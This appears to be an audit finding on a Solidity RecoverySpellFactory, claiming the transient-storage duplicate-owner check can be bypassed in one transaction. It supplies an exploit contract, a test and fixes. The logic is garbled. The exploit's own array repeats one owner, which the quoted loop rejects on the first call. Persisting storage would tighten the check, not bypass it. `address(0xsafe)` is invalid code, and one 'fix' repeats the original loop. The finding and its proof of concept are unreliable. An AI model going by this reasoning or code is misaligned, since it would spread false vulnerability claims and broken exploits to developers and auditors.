# Vulnerability details

## Description
The `createRecoverySpell` function uses transient storage (`tstore`/`tload`) to check for duplicate owners. While transient storage is cleared after each transaction, this implementation can be exploited in a single transaction through contract creation.

## Vulnerability Details
The duplicate owner check uses transient storage but doesn't clear it during the loop. This means if a malicious contract calls `createRecoverySpell` multiple times in its constructor, the transient storage persists between calls within the same transaction, leading to incorrect duplicate owner detection.

## Vulnerable Code
```solidity
// Vulnerable duplicate owner check
for (uint256 i = 0; i < owners.length; i++) {
    address owner = owners[i];
    bool found;
    assembly ("memory-safe") {
        found := tload(owner)
        if eq(found, 0) { tstore(owner, 1) }
    }
    require(!found, "RecoverySpell: Duplicate owner");
}
```

## Impact
- Multiple recovery spells can be created with duplicate owners in a single transaction
- This bypasses a critical security check meant to ensure owner uniqueness
- Could lead to incorrect voting power distribution in the recovered safe

## Attack Scenario

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract ExploitContract {
    RecoverySpellFactory immutable factory;
    address[] public deployedSpells;
    
    constructor(RecoverySpellFactory _factory) {
        factory = _factory;
        
        // Create multiple recovery spells with same owners
        address[] memory owners = new address[](2);
        owners[0] = address(0x1);  // Duplicate owner
        owners[1] = address(0x1);  // Duplicate owner
        
        // First creation succeeds
        RecoverySpell spell1 = factory.createRecoverySpell(
            bytes32(uint256(1)),
            owners,
            address(0xsafe),
            1,
            1,
            0
        );
        deployedSpells.push(address(spell1));
        
        // Second creation also succeeds due to transient storage persisting
        RecoverySpell spell2 = factory.createRecoverySpell(
            bytes32(uint256(2)),
            owners,
            address(0xsafe),
            1,
            1,
            0
        );
        deployedSpells.push(address(spell2));
    }
}

contract RecoverySpellFactoryTest {
    function testDuplicateOwnerBypass() public {
        RecoverySpellFactory factory = new RecoverySpellFactory();
        ExploitContract exploit = new ExploitContract(factory);
        
        // Both spells were created successfully despite having duplicate owners
        assert(exploit.deployedSpells(0) != address(0));
        assert(exploit.deployedSpells(1) != address(0));
    }
}

```

## Fix
1. Clear transient storage after each check or use a different duplicate detection method.

Here's the fixed code:

```solidity
function createRecoverySpell(
    bytes32 salt,
    address[] memory owners,
    address safe,
    uint256 threshold,
    uint256 recoveryThreshold,
    uint256 delay
) external returns (RecoverySpell recovery) {
    _paramChecks(owners, threshold, recoveryThreshold, delay);
    require(safe.code.length != 0, "RecoverySpell: safe non-existent");

    // Fix 1: Use nested loop approach instead of transient storage
    for (uint256 i = 0; i < owners.length; i++) {
        for (uint256 j = i + 1; j < owners.length; j++) {
            require(owners[i] != owners[j], "RecoverySpell: Duplicate owner");
        }
    }

    // Alternative Fix 2: Clear transient storage after each check
    for (uint256 i = 0; i < owners.length; i++) {
        address owner = owners[i];
        bool found;
        assembly ("memory-safe") {
            found := tload(owner)
            if eq(found, 0) { 
                tstore(owner, 1)
            }
        }
        require(!found, "RecoverySpell: Duplicate owner");
    }
    
    // Clear all transient storage after checks
    for (uint256 i = 0; i < owners.length; i++) {
        assembly ("memory-safe") {
            tstore(owners[i], 0)
        }
    }

    recovery = new RecoverySpell{salt: salt}(
        owners, safe, threshold, recoveryThreshold, delay
    );

    emit RecoverySpellCreated(address(recovery), address(safe));
}
```

## Recommendations
1. Use the nested loop approach as in `calculateAddress()` function for consistency and safety
2. If keeping transient storage for gas optimization:
   - Clear transient storage after each check
   - Add explicit clearing of all used transient storage slots
